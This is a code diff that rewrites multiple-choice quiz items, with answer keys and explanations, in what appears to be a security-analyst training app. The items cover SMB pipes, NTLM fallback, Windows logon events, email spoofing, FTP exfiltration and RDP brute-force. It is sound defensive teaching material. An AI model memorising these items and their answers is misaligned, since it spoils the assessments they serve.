+        "explanation": "svcctl is the pipe for the Service Control Manager. Opening it right after reaching ADMIN$ matches the PsExec-style sequence: drop a file on ADMIN$, then use svcctl to create and start a service that runs it. \"List which shares SRV-DB01 exposes\" is wrong: share enumeration uses the srvsvc pipe (Server service), not svcctl. \"Enumerate local users and groups\" is wrong: that is the samr pipe (Security Account Manager). \"Read or change the registry\" is wrong: remote registry access goes through the winreg pipe."
       },
       {
-        "question": "In an Active Directory environment where Kerberos is expected, you notice a spike of SMB network logons (Event ID 4624, Logon Type 3) whose Authentication Package field shows NTLM instead. Why is this worth investigating?",
+        "question": "In an Active Directory domain where Kerberos is expected, you notice a spike of Event ID 4624 entries with Logon Type 3 whose Authentication Package field reads NTLM. What is the most accurate reading?",
         "options": [
           {
-            "label": "NTLM is a weaker, hash-based challenge-response protocol without mutual authentication and is vulnerable to relay attacks, so a spike may indicate a downgrade, misconfiguration, or tooling deliberately avoiding Kerberos.",
+            "label": "Network logons fell back from Kerberos, which can mean IP-based access, legacy tools, or a relay attempt.",
             "value": "a"
           },
           {
-            "label": "NTLM and Kerberos are simply two names for the exact same protocol, so a spike in the Authentication Package field has no security meaning whatsoever.",
+            "label": "These logons failed and were retried with NTLM, so the spike should be investigated as password guessing.",
             "value": "b"
           },
           {
-            "label": "The Authentication Package field only ever appears on DHCP lease events, not SMB logons, so its presence here indicates a corrupted log entry.",
+            "label": "Logon Type 3 with NTLM marks interactive console logons, so someone is signing in at those servers locally.",
             "value": "c"
           },
           {
-            "label": "NTLM is strictly more secure than Kerberos because it always requires a smart card, so this spike actually indicates improved authentication hygiene.",
+            "label": "The sessions likely negotiated SMB1, because NTLM authentication is tied to the legacy SMB1 dialect.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "NTLM lacks mutual authentication and its hash-based challenge-response design underlies pass-the-hash and SMB relay attacks, so an unexpected spike of NTLM where Kerberos should dominate is a real signal of misconfiguration, legacy tooling, or a possible downgrade/relay attempt. The 'same protocol' option falsely equates two distinct protocols. The DHCP lease events option misattributes a normal SMB/AD field to DHCP. The 'strictly more secure' option fabricates a smart-card requirement that NTLM does not have."
+        "explanation": "4624 Logon Type 3 is a successful network logon, which is what an SMB connection produces. Windows tries Kerberos first and falls back to NTLM, for example when a host is reached by IP address, a system is not domain-joined, or legacy tooling is used. An unexpected spike can also be a relay or downgrade attempt avoiding Kerberos. \"These logons failed and were retried\" is wrong: 4624 records a successful logon, and failed logons are recorded separately. \"Interactive console logons\" is wrong: Logon Type 3 means network, not interactive. \"Likely negotiated SMB1\" is wrong: the authentication protocol is separate from the dialect; SMB2 and SMB3 can carry either Kerberos or NTLM."
       },
       {
-        "question": "In a packet capture on a modern, hardened Windows network you see an SMB session negotiate the SMB1 dialect (NT LM 0.12) and succeed. Why is this worth investigating?",
+        "question": "Event ID 5140 on SRV-DB01 shows that WKS-041 connected to the IPC$ share. Your lead asks you to prove which named pipe the session opened inside it. Which evidence answers that, if it is being collected?",
         "options": [
           {
-            "label": "SMB1 is the legacy, EternalBlue-vulnerable dialect that modern Windows disables by default, so its use signals a legacy device or a deliberate downgrade.",
+            "label": "Event ID 5145 on SRV-DB01, which logs each object access inside a share, including the pipe name.",
             "value": "a"
           },
           {
-            "label": "SMB1 is the newest and most secure dialect, so seeing it negotiated confirms the network is fully patched and needs no further review of that host at all.",
+            "label": "Further 5140 events, since 5140 is logged again for every file or pipe the session opens in the share.",
             "value": "b"
           },
           {
-            "label": "SMB1 is simply the encrypted version of SMB3, so a successful SMB1 negotiation proves that end-to-end encryption was correctly enforced on the session.",
+            "label": "The 4624 Logon Type 3 event on SRV-DB01, whose Authentication Package field names the pipe used.",
             "value": "c"
           },
           {
-            "label": "SMB1 is only ever used by DNS servers, so its appearance in an SMB capture indicates a name-resolution service and has nothing to do with file sharing.",
+            "label": "The client's NEGOTIATE request in a capture, since the list it sends names the pipes it intends to use.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "SMB1 (dialect NT LM 0.12) is the original 1990s protocol containing the flaw EternalBlue/WannaCry exploited; modern Windows negotiates 2.0.2 through 3.1.1 and does not speak SMB1 unless the legacy feature is explicitly re-enabled, so a successful SMB1 negotiation means an aging device or a deliberate downgrade — either way, a finding. The 'newest and most secure' option inverts the facts (SMB1 is the oldest and weakest, not newest). The 'encrypted version of SMB3' option confuses SMB1 with SMB3 encryption. The 'only used by DNS servers' option invents a DNS association SMB1 does not have."
+        "explanation": "5145 fires for every object-level access check inside a share (each file, folder or named pipe) and records whether access was granted. It is the event that shows svcctl or samr being opened inside IPC$. Because it is so noisy, it is usually enabled only on chosen shares through 'Audit Detailed File Share', hence \"if it is being collected\". \"Further 5140 events\" is wrong: 5140 fires once, the first time a session connects to a share, not for each object inside it. \"The 4624 Logon Type 3 event\" is wrong: its Authentication Package field says Kerberos or NTLM, not which pipe was opened. \"The client's NEGOTIATE request\" is wrong: NEGOTIATE lists the dialects the client can speak, not the pipes it will open."
       }
     ],
     "references": [
@@ -9531,70 +9623,70 @@ const NEW_TOPIC_LESSONS = [
         "question": "In web server logs you see one external IP send hundreds of GET requests within a minute to paths like /admin, /backup, /wp-login.php, and /phpmyadmin, almost all returning 404 Not Found. What does this pattern indicate?",
         "options": [
           {
-            "label": "A successful data exfiltration, because stealing data always appears as a rapid series of GET requests to common admin paths that all return 404 errors.",
+            "label": "Credential stuffing, since each 404 is a login attempt with a stolen username and password pair being rejected by the server.",
             "value": "a"
           },
           {
-            "label": "Reconnaissance: the attacker is probing for hidden or vulnerable pages, and the burst of 404s shows most guessed paths do not exist on the server.",
+            "label": "Reconnaissance: the attacker is probing for hidden or vulnerable pages, and the burst of 404s shows most guessed paths do not exist.",
             "value": "b"
           },
           {
-            "label": "Normal user browsing, because a person loading a single web page legitimately requests hundreds of different admin URLs that return 404 in under a minute.",
+            "label": "A search-engine crawler indexing the site, which naturally requests admin and login paths and accepts the resulting 404s.",
             "value": "c"
           },
           {
-            "label": "A TLS handshake failure, because HTTPS certificate errors are recorded in web logs as a rapid sequence of 404 responses to administrative URL paths.",
+            "label": "A password brute-force, since hammering /wp-login.php guesses credentials and each 404 is one rejected password attempt.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A burst of requests walking through common admin/CMS paths that mostly return 404 is classic reconnaissance — the attacker is guessing for hidden or vulnerable pages, and the 404s show those paths do not exist. The data-exfiltration option wrongly ties this recon pattern to exfiltration, which is outbound and large, not 404-heavy probing. The 'normal user browsing' option is false because normal browsing does not request hundreds of admin URLs. The TLS handshake failure option misattributes a TLS problem to 404 status codes."
+        "explanation": "Correct: a rapid spray of GETs to many well-known admin/CMS paths that mostly return 404 is directory/forced-browsing reconnaissance — the attacker is mapping what exists, and the 404s mark the guesses that do not. The credential-stuffing option misreads the codes: stuffing is POSTs to a login endpoint answered with 401, not GETs returning 404. The search-crawler option is wrong: legitimate crawlers follow a site's own links and robots rules, not a list of attacker wordlist paths at that speed. The brute-force option confuses a failed password (which returns 401 on a login POST) with a path that simply does not exist (404)."
       },
       {
         "question": "Your organisation uses HTTPS everywhere, so a network sensor can no longer read the URLs and content of web traffic. Why can analysts still detect malware command-and-control, and what do they rely on?",
         "options": [
           {
-            "label": "They cannot detect anything once HTTPS is used, because TLS encryption removes every possible signal, so C2 over port 443 is completely undetectable.",
+            "label": "They read the SNI field in the TLS handshake, which Encrypted Client Hello (ECH) keeps in cleartext so the destination domain is always visible.",
             "value": "a"
           },
           {
-            "label": "HTTPS hides content but not metadata, so analysts use destination, timing/regularity, data volume, endpoint logs, and TLS/JA3 fingerprinting to spot C2.",
+            "label": "HTTPS hides content but not metadata, so analysts use destination, beacon timing and regularity, data volume, endpoint logs, and TLS/JA3 fingerprinting.",
             "value": "b"
           },
           {
-            "label": "HTTPS automatically blocks all malware, so any traffic that reaches port 443 is guaranteed safe and requires no monitoring or investigation at all.",
+            "label": "They inspect the traffic at a TLS-terminating proxy holding the session keys, which is the single signal available once content is encrypted.",
             "value": "c"
           },
           {
-            "label": "Analysts simply decrypt all TLS traffic instantly without any keys, because HTTPS encryption can be reversed by any network sensor on demand.",
+            "label": "They match the malware's bytes against antivirus signatures, since the payload stays readable on the wire even inside the TLS tunnel.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "TLS encrypts the content of HTTPS but leaves metadata visible — which client talked to which server, when, how often, how much data, and the destination — so analysts detect C2 through beaconing regularity, suspicious destinations, volume, endpoint logs that see the full URL pre-encryption, and TLS/JA3 fingerprinting. The 'cannot detect anything' option overstates the loss of visibility. The 'HTTPS blocks all malware' option falsely claims HTTPS blocks malware. The 'decrypt without keys' option is wrong because TLS cannot be decrypted without keys."
+        "explanation": "Correct: TLS encrypts the content but leaves rich metadata — who you talk to, how regularly, how much data, plus host-side telemetry and JA3 client fingerprints — which is what reveals beaconing C2. The SNI option is doubly wrong: ECH is designed to hide the SNI, not keep it visible. The proxy option names a real technique (TLS inspection) but overstates it as the only signal, ignoring all the metadata that needs no decryption. The antivirus-signature option is wrong because the payload bytes are encrypted on the wire, so there is nothing in cleartext for a network signature to match."
       },
       {
         "question": "An attacker uses a cross-site scripting flaw to steal a logged-in user's session cookie, then submits that exact cookie value to the same website from a completely different device. What happens, and why is this dangerous?",
         "options": [
           {
-            "label": "Nothing happens, because HTTP is stateless and therefore no cookie value can ever be reused to represent a previously authenticated user.",
+            "label": "Nothing, because the session cookie is tied to the original device's IP address, so the server rejects it when it arrives from a new address.",
             "value": "a"
           },
           {
-            "label": "The server treats the attacker as the logged-in user, because the session cookie alone proves identity to a stateless protocol — session hijacking.",
+            "label": "The server treats the attacker as the logged-in user, because to a stateless protocol the valid session cookie alone proves identity — session hijacking.",
             "value": "b"
           },
           {
-            "label": "The website automatically blocks the request, because servers always detect a cookie being sent from a new device and reject it outright.",
+            "label": "The server rejects it, because the session cookie is cryptographically bound to the original TLS connection and cannot be replayed elsewhere.",
             "value": "c"
           },
           {
-            "label": "The attacker only sees the public homepage, because session cookies never grant access to any authenticated pages under any circumstances.",
+            "label": "The attacker reaches only public pages, because a session cookie must be presented together with the user's password on every request.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Because HTTP is stateless, the server relies on the session cookie/token alone to recognise a logged-in user; if an attacker obtains a valid cookie, presenting it makes the server treat them as that user without needing a password — this is session hijacking, and it is exactly why protecting and limiting the lifetime of session tokens matters. The 'nothing happens' option misunderstands statelessness, which is precisely why cookies were invented to bridge the gap. The automatic-blocking option overstates default protections; not all servers detect this automatically. The 'public homepage only' option is false because a valid session cookie is exactly what grants access to authenticated pages."
+        "explanation": "Correct: HTTP is stateless, so the server recognises a returning user purely by the session cookie; whoever presents a valid one is treated as that user, which is why a stolen cookie enables session hijacking from any device. The IP-binding option is a common misconception — ordinary session cookies are not pinned to an IP by default. The TLS-binding option describes token binding, a protection that is rarely deployed, so by default the cookie replays fine. The password option is wrong: after login the cookie stands in for the credentials, and the password is not re-sent on each request."
       }
     ],
     "references": [
@@ -9668,96 +9760,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A user reports an email that appears to come from the company CEO requesting an urgent wire transfer. Which SMTP-related evidence best helps you determine whether the sender address was forged?",
+        "question": "Your company’s domain publishes this SPF record: v=spf1 include:_spf.google.com ip4:203.0.113.10 ~all. A colleague says it tells receivers to reject any mail sent from a server not listed in it. Is that right?",
         "options": [
           {
-            "label": "The DHCP lease table, because it records which mail server was authorised to send on behalf of the CEO's domain at the time the message was sent.",
+            "label": "Yes: any server not listed fails SPF, and the record tells receivers to refuse that mail outright",
             "value": "a"
           },
           {
-            "label": "The email headers, especially the SPF, DKIM, and DMARC authentication results, since failures strongly indicate the From address was spoofed.",
+            "label": "Not quite: ~all is a soft fail, so unlisted senders are accepted but marked suspicious",
             "value": "b"
           },
           {
-            "label": "The recipient's IMAP folder size, because a forged sender always causes the mailbox to grow at an abnormal rate that reveals the spoofing attempt.",
+            "label": "No: ~all means “all other servers too”, so the record lets any server send for the domain",
             "value": "c"
           },
           {
-            "label": "Nothing can tell you, because SMTP cryptographically guarantees every From address is genuine, so a displayed CEO address is always authentic.",
+            "label": "No: SPF checks only the visible From: name, so the listed servers do not affect delivery",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Because basic SMTP does not verify the sender, the way to judge authenticity is the email headers — the Received path, the envelope-vs-From addresses, and especially the SPF/DKIM/DMARC results, where failures strongly indicate spoofing. The DHCP lease table option misuses DHCP, which has nothing to do with mail authorisation. The IMAP folder size option invents a mailbox-size signal that does not exist. The 'nothing can tell you' option is the opposite of the truth: SMTP does not guarantee the From address is genuine, which is exactly why spoofing works."
+        "explanation": "The closing mechanism decides what happens to unlisted servers. ~all is a soft fail: receivers are asked to accept such mail but treat it as suspicious. Only -all (hard fail) says unlisted servers are not authorised and the mail should be rejected or strongly distrusted, so this domain has weaker protection than the colleague thinks. ~all does not authorise everyone; unlisted servers still fail SPF, just softly. SPF checks whether the sending server is on the domain’s list (the envelope sender’s domain, shown as smtp.mailfrom), not the display name; tying the result to the visible From: is DMARC’s alignment job."
       },
       {
-        "question": "Why is email spoofing fundamentally easy, and what mechanisms were added to address it?",
+        "question": "Why is email spoofing fundamentally easy, and which mechanisms were added to address it?",
         "options": [
           {
-            "label": "Because basic SMTP simply believes the sender address it is told; SPF, DKIM, and DMARC were added (published in DNS) to authenticate senders afterward.",
+            "label": "Basic SMTP believes whatever sender it is told; SPF, DKIM and DMARC were added later, published in DNS",
             "value": "a"
           },
           {
-            "label": "Because SMTP encrypts every message so strongly that receivers cannot check the sender; TLS 1.3 was added later to finally allow sender verification.",
+            "label": "SMTP sends mail in plaintext; STARTTLS was added later so the receiving server could verify the sender",
             "value": "b"
           },
           {
-            "label": "Because email is delivered over port 3389, which has no authentication; moving email to port 22 was the fix that eliminated all spoofing.",
+            "label": "Port 25 relay needs no login; requiring AUTH on port 587 was added and now blocks spoofed inbound mail",
             "value": "c"
           },
           {
-            "label": "Because spoofing requires stealing the sender's password first; enforcing longer passwords was the mechanism created to make forgery impossible.",
+            "label": "Mail servers relayed for anyone; closing open relays was the fix that stopped forged From: addresses",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Spoofing is easy because basic SMTP was designed for a trusting network and simply accepts the sender address it is given without verification; SPF (allowed sending servers), DKIM (cryptographic signature), and DMARC (alignment and policy) were added and published in DNS to authenticate senders after the fact. The TLS 1.3 option is wrong because encryption is not why spoofing works. The port 3389 option invents wrong ports (email is not on 3389/22). The stolen-password option is false because spoofing needs no password — the attacker just states a false From address."
+        "explanation": "SMTP was designed for a small, trusting network: the MAIL FROM and the From: header are simply stated by the sender and believed. Sender authentication was bolted on afterwards with SPF (allowed servers), DKIM (a signature) and DMARC (alignment and policy), all published in DNS. STARTTLS encrypts the session in transit; it says nothing about whether the sender is genuine. AUTH on port 587 controls who may submit mail through your own server; it does not check mail that other servers deliver to you. Closed relays stop strangers using your server, but an attacker can still send a forged From: from their own server."
       },
       {
-        "question": "In a forwarded phishing email's headers, the visible From: address looks correct, but the Return-Path reads j.carter@corp-exarnple.com (swapped letters) and Authentication-Results shows spf=fail, dkim=none, dmarc=fail. What should the analyst conclude?",
+        "question": "A user forwards an email that appears to come from the CEO. Its headers include: From: “John Carter, CEO” <j.carter@corp-example.com>; Return-Path: <j.carter@corp-exarnple.com>; Received: from mail.unrelated-host.net (203.0.113.90) by mx.corp-example.com; Authentication-Results: spf=fail, dkim=none, dmarc=fail. What should the analyst conclude?",
         "options": [
           {
-            "label": "The message is confirmed spoofed from a lookalike domain, since the failing authentication results and the mismatched Return-Path both point to forgery.",
+            "label": "Spoofed from a lookalike domain: the Return-Path is corp-exarnple.com and SPF and DMARC both fail",
             "value": "a"
           },
           {
-            "label": "The message is safe, because a visually correct From: display name always overrides any Return-Path or authentication result shown in the headers.",
+            "label": "Probably genuine: the From: is the CEO’s real address, and dkim=none only means the domain doesn’t sign",
             "value": "b"
           },
           {
-            "label": "The failing results are a formatting bug, because SPF, DKIM, and DMARC checks routinely fail on legitimate mail for no meaningful reason at all.",
+            "label": "Spoofed, but sent from the company’s own server, since the Received: line names mx.corp-example.com",
             "value": "c"
           },
           {
-            "label": "The lookalike Return-Path is irrelevant, because only the visible From: name is ever used to determine whether a message is genuine or forged.",
+            "label": "A typo by the CEO: the Return-Path was mistyped when sending, so the From: address is the one to trust",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A lookalike Return-Path domain combined with spf=fail, dkim=none, and dmarc=fail is exactly the evidence trail this lesson describes for a spoofed message — the visible From: is easy to fake, but the envelope path and authentication results are not, and here they both point clearly to forgery. The 'message is safe' option wrongly treats the easily-faked display name as authoritative. The 'formatting bug' option dismisses a genuine, meaningful signal as a bug. The claim that the Return-Path is irrelevant ignores the Return-Path mismatch, which is one of the clearest spoofing tells covered in this lesson."
+        "explanation": "The visible From: is the easiest field to fake. The Return-Path (the envelope MAIL FROM) uses corp-exarnple.com, a lookalike with “rn” in place of “m”, and the receiving server reports spf=fail and dmarc=fail: the message did not come from the real domain. A correct-looking From: proves nothing, and dkim=none does not excuse the SPF and DMARC failures. In a Received: line, “by” names the server that received the message (your own MX) and “from” names where it came from, here an unrelated host. A mistyped Return-Path would not also make SPF and DMARC fail for the CEO’s real domain."
       },
       {
-        "question": "In your mail-server logs you notice a single external source issuing a rapid series of VRFY and EXPN commands against many different usernames before any message is ever sent. What is this most likely, and why do hardened servers disable these commands?",
+        "question": "Mail-server logs show one external source issuing a rapid series of VRFY and EXPN commands against many different usernames, without ever sending a message. What is this most likely, and why do hardened servers disable these commands?",
         "options": [
           {
-            "label": "Username enumeration: VRFY confirms whether a mailbox exists and EXPN lists a mailing list's members, so servers disable them to deny attackers a valid-address map before phishing or password spraying.",
+            "label": "Username enumeration: VRFY confirms a mailbox exists and EXPN lists a group’s members, mapping valid addresses",
             "value": "a"
           },
           {
-            "label": "A routine encryption handshake, because VRFY and EXPN are the two commands that negotiate STARTTLS and must run before every legitimate message is delivered.",
+            "label": "An open-relay test: the source is checking whether this server will forward mail for domains it does not host",
             "value": "b"
           },
           {
-            "label": "A DNS lookup sequence, because VRFY and EXPN are how a sending server resolves the recipient domain's MX record prior to relaying any mail.",
+            "label": "A greylisting retry: the sender got 4yz replies earlier and is re-checking each recipient before resending",
             "value": "c"
           },
           {
-            "label": "Proof the connection is safe, since VRFY and EXPN are available only to already-authenticated administrators and can never be issued by an outside attacker.",
+            "label": "Normal client behaviour: mail clients confirm each recipient with VRFY before they send the DATA command",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "VRFY asks the server to confirm a mailbox exists and EXPN expands a mailing list into its member addresses; a burst of them from one external source before any mail is sent is classic username enumeration, harvesting valid addresses for later phishing or password spraying, which is exactly why hardened servers disable or neuter both. The encryption-handshake option invents a role in STARTTLS these commands do not have. The DNS lookup option confuses them with DNS/MX resolution. The 'proof the connection is safe' option falsely claims they require admin authentication."
+        "explanation": "VRFY asks whether a mailbox exists and EXPN expands a mailing list into its members, so a burst of both from one outside source with no mail sent is reconnaissance: building a list of valid addresses for phishing or password spraying. Hardened servers disable them, or give uninformative answers, to deny that map. An open-relay test uses MAIL FROM and RCPT TO for an outside domain, not VRFY or EXPN. A greylisted sender simply retries delivery later. Ordinary clients send RCPT TO for each recipient; they do not need VRFY to deliver mail."
       }
     ],
     "references": [
@@ -9822,96 +9914,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An analyst captures network traffic and, in a plain FTP session on port 21, can directly read 'USER backupadmin' and 'PASS Wint3r2026!'. Why is this possible, and what does it imply?",
+        "question": "An analyst captures network traffic and, in an FTP session on port 21, can directly read “USER backupadmin” and “PASS Wint3r2026!”. What explains this?",
         "options": [
           {
-            "label": "It is impossible; FTP always encrypts credentials, so the analyst must have misread an unrelated HTTPS session that happened to use port 21.",
+            "label": "The session was FTPS, and the capture tool removed the TLS layer automatically because it saw port 21.",
             "value": "a"
           },
           {
-            "label": "Classic FTP sends the login and file data in plaintext, so credentials are readable in captured traffic — a serious exposure that argues for FTPS or SFTP.",
+            "label": "Classic FTP sends its commands, USER and PASS included, as plain text that anyone capturing it can read.",
             "value": "b"
           },
           {
-            "label": "The credentials are only visible because the analyst has the decryption key; without it, plain FTP traffic is fully encrypted and unreadable.",
+            "label": "It was SFTP running on port 21, which shows the login in clear text before its encryption starts.",
             "value": "c"
           },
           {
-            "label": "This proves the FTP server is secure, because a properly configured server deliberately displays credentials in the clear to confirm they were received.",
+            "label": "Any file-transfer login looks like this in a capture, so moving to SFTP would not change what is visible.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Classic FTP transmits everything — including the USER and PASS commands and the file contents — as unencrypted plaintext, so anyone capturing the traffic can read the credentials directly; this is a serious exposure and the reason to use FTPS (FTP + TLS) or SFTP (over SSH) instead. The claim that FTP always encrypts credentials is wrong because plain FTP does not encrypt credentials. The decryption-key option is false because no key is involved in reading plaintext. The 'proves the server is secure' option absurdly reframes a vulnerability as a feature."
+        "explanation": "Classic FTP sends everything — the USER and PASS commands and the file contents — unencrypted, so a capture shows the credentials directly; that is a serious exposure and the reason to move to FTPS or SFTP. The FTPS option is wrong because FTPS wraps FTP in TLS precisely so the login is not readable, and a capture tool does not remove TLS just because of the port number. The SFTP option confuses the two similar names: SFTP is file transfer over SSH (port 22), encrypted from the start. The “any login looks like this” option is wrong because both FTPS and SFTP solve the plaintext problem — with them, the analyst would see encrypted traffic, not USER and PASS."
       },
       {
-        "question": "During an investigation you notice an internal workstation making an outbound FTP connection to an unfamiliar external server and transferring several gigabytes of data. Why is this a high-priority finding?",
+        "question": "Zeek’s ftp.log shows internal workstation 10.14.22.108 (id.orig_h) talking to 203.0.113.77 on port 21 (id.resp_h), an external server the company does not run. The session issues three STOR commands, each answered with reply code 226, and conn.log shows about 500 MB sent from the workstation. What do these logs show?",
         "options": [
           {
-            "label": "It is routine, because workstations normally back up several gigabytes to random external FTP servers over plaintext port 21 as part of standard operations.",
+            "label": "The workstation downloaded three files from the external server, since STOR saves files to the local disk.",
             "value": "a"
           },
           {
-            "label": "FTP's purpose is bulk file transfer, so a large outbound FTP transfer to an unfamiliar server is a classic data-exfiltration pattern worth investigating.",
+            "label": "The workstation uploaded about 500 MB to an outside server — a possible data exfiltration to investigate.",
             "value": "b"
           },
           {
-            "label": "It only indicates a DNS problem, because outbound FTP transfers are the standard symptom of a failed name-resolution lookup on the workstation.",
+            "label": "The transfers failed, because 226 is an error code meaning the data connection was closed too early.",
             "value": "c"
           },
           {
-            "label": "It confirms the workstation is patched, because only fully updated machines are permitted to open outbound FTP connections to external servers.",
+            "label": "The files were pulled from an internal server by the external host, so the workstation was just a relay.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "FTP exists to move files in bulk, so an internal machine sending several gigabytes over outbound FTP to an unfamiliar external server matches the classic data-exfiltration pattern and warrants immediate investigation. The 'routine backups' option wrongly normalises large transfers to random external FTP servers. The DNS-problem option misattributes the behaviour to DNS. The 'confirms it is patched' option invents a patching implication unrelated to the observation."
+        "explanation": "STOR is the upload command, the workstation is the FTP client (id.orig_h), and the bytes in conn.log were sent from it, so about 500 MB left the network to an unfamiliar external server — the classic exfiltration pattern the lesson describes. The download option swaps the commands: RETR retrieves (downloads), STOR stores (uploads). The failure option misreads the code: 226 means the data connection is closing because the requested file action succeeded. The relay option invents a path the logs do not show: the workstation itself opened the session as the client and sent the data."
       },
       {
-        "question": "A vulnerability report flags an old FTP server for allowing the FTP bounce technique via the PORT command. What does this attack actually let someone do, and why is it dangerous?",
+        "question": "A vulnerability report flags an old FTP server for allowing the FTP bounce technique via the PORT command. What does this weakness let someone do?",
         "options": [
           {
-            "label": "It lets a client direct the FTP server to open a data connection to a third-party address, using the server as a relay that hides the true source.",
+            "label": "Make the server open a data connection to a third machine, using the server as a relay that hides the source.",
             "value": "a"
           },
           {
-            "label": "It lets a client instantly decrypt any file stored on the FTP server, exposing every uploaded document without needing valid login credentials at all.",
+            "label": "Step out of the permitted folder with “../” paths and read files stored elsewhere on the same server.",
             "value": "b"
           },
           {
-            "label": "It lets a client permanently delete the server's entire file system, since the PORT command was originally designed to issue remote deletion requests.",
+            "label": "Log in without a password, using the generic “anonymous” account that older servers shipped enabled.",
             "value": "c"
           },
           {
-            "label": "It lets a client change the FTP server's administrator password remotely, since the PORT command doubles as a legacy password-reset mechanism.",
+            "label": "Read other users’ passwords in transit, because the PORT command carries the credentials in clear text.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The FTP bounce attack abuses the PORT command's ability to specify an arbitrary destination IP and port for the data connection, letting an attacker make the FTP server open a connection to a third machine on their behalf — effectively relaying and disguising the true source of the traffic, useful for scanning systems the attacker cannot reach directly. The instant-decryption option invents a decryption capability the PORT command does not have. The file-system deletion and password-reset options both invent unrelated destructive/administrative capabilities that PORT was never designed for."
+        "explanation": "The FTP bounce attack abuses PORT, which in active mode tells the server which IP address and port to send data to; if the server does not restrict it to the client’s own address, it can be told to connect to a third machine, acting as a relay that disguises the true source. The “../” option describes directory traversal, a different legacy weakness. The anonymous-login option describes weak default configuration, another separate finding. The clear-text option mixes in the plaintext problem: credentials travel in the USER and PASS commands, not in PORT, which only carries an address and port."
       },
       {
-        "question": "In a captured classic FTP session you see the client send PASV and the server reply 227 Entering Passive Mode, and separately you can read the client's PASS command in cleartext. What do these two observations tell you?",
+        "question": "In a captured classic FTP session you see the client send PASV and the server reply “227 Entering Passive Mode”, and separately you can read the client’s PASS command in clear text. What do these two observations tell you?",
         "options": [
           {
-            "label": "The session uses passive mode (client opens the data connection to a server-specified port, which is firewall-friendly) and, being classic plaintext FTP, exposes the password in the capture — an exfil-channel and credential-exposure concern.",
+            "label": "Passive mode: the client opens the data connection to a port the server named, and the password is exposed.",
             "value": "a"
           },
           {
-            "label": "The 227 reply proves the session is fully encrypted end to end, so the readable PASS command must be a decoding error in the capture tool rather than a real exposure.",
+            "label": "Active mode: the server will connect back to the client from port 20, and the password is exposed.",
             "value": "b"
           },
           {
-            "label": "PASV means the server will delete all uploaded files automatically, so no data could ever leave the network through this session no matter what commands follow.",
+            "label": "Passive mode, but 227 means the server has now switched the session to TLS, so the password is protected.",
             "value": "c"
           },
           {
-            "label": "227 is a permanent-failure code, so the login was rejected and the visible PASS command is therefore harmless and can be safely ignored by the analyst.",
+            "label": "227 is a refusal of passive mode, so no data channel opened and the readable PASS command is harmless.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "PASV / 227 Entering Passive Mode means the client will open the data connection to a port the server specifies (the firewall-friendly modern default), and because this is classic plaintext FTP the PASS command is readable in the capture — both a credential-exposure and a potential exfiltration concern. The 'fully encrypted' option is wrong: 227 has nothing to do with encryption, and plaintext really is readable. The claim that PASV deletes uploaded files invents an auto-delete behaviour PASV does not have. The 'permanent-failure code' option misreads 227 (a 2yz success/intermediate code, not a 5yz permanent failure)."
+        "explanation": "PASV with reply 227 means passive mode: the server returns an IP and port, and the client opens the data connection to it (the firewall-friendly default). Because this is classic FTP, the PASS command is readable, so the password is exposed. The active-mode option reverses the roles: in active mode the server connects back to the client, traditionally from port 20, and the client would have sent PORT, not PASV. The TLS option is wrong because 227 has nothing to do with encryption — the readable PASS command shows the session is plain text. The refusal option misreads the code: 227 is a 2yz success reply, not a failure."
       }
     ],
     "references": [
@@ -9988,93 +10080,93 @@ const NEW_TOPIC_LESSONS = [
         "question": "In Windows Security logs on an internet-reachable server you find hundreds of Event ID 4625 (failed logon) entries with logon type 3 from many IPs (the server enforces NLA, so failed RDP attempts are rejected before a session exists and are logged as Network logons), followed by one Event ID 4624 (successful logon) type 10 from a foreign IP. What does this indicate and why does it matter?",
         "options": [
           {
-            "label": "A normal software update, because Windows Update authenticates by generating hundreds of failed RemoteInteractive logons before one succeeds from an overseas server.",
+            "label": "A password spray that never broke in — the many 4625s are failed guesses and the single type 10 4624 is an unrelated, legitimate admin logon.",
             "value": "a"
           },
           {
-            "label": "A successful RDP brute-force: many failed remote logons then a success (type 10) signals an attacker gained an interactive desktop session — a likely compromise and common ransomware entry.",
+            "label": "A successful RDP brute-force: many failed network logons then a type 10 success means an attacker gained an interactive desktop — a likely compromise and common ransomware entry.",
             "value": "b"
           },
           {
-            "label": "A DNS cache error, because failed and successful RemoteInteractive logon events are the standard way Windows records name-resolution problems on a server.",
+            "label": "An administrator mistyping their password several times before finally logging in, so the single success is that same admin and no attacker is involved.",
             "value": "c"
           },
           {
-            "label": "Nothing important, because logon type 10 events are informational only and never indicate remote access or any kind of attacker activity on the machine.",
+            "label": "An account-lockout misconfiguration generating phantom 4625s, with the 4624 just showing the policy resetting itself — a tuning issue, not an intrusion.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Logon type 10 is RemoteInteractive (RDP); with NLA, failed RDP attempts are logged as type 3 because the password is checked before any session exists, so many type-3 4625 failures followed by a type-10 4624 success from a foreign IP is the signature of a successful RDP brute-force, giving the attacker an interactive desktop session — a likely compromise and one of the most common ransomware entry points, demanding immediate investigation. The software update option invents update behaviour. The DNS cache error option misattributes logon events to DNS. The 'nothing important' option wrongly dismisses type-10 logons, which specifically indicate remote desktop access."
+        "explanation": "Correct: a flood of failed network logons followed by a type 10 (RemoteInteractive) success from a foreign IP is the signature of a successful RDP brute-force, which is a leading ransomware entry point and must be investigated as a likely compromise. The password-spray option is tempting but ignores that the success came from the same foreign-IP pattern immediately after the failures, not an unrelated admin. The mistyping-admin option cannot explain hundreds of failures from many IPs ending in a foreign-IP success. The lockout-misconfiguration option invents phantom events: 4625s are real rejected authentications, and a 4624 type 10 is a genuine interactive logon, not a policy reset."
       },
       {
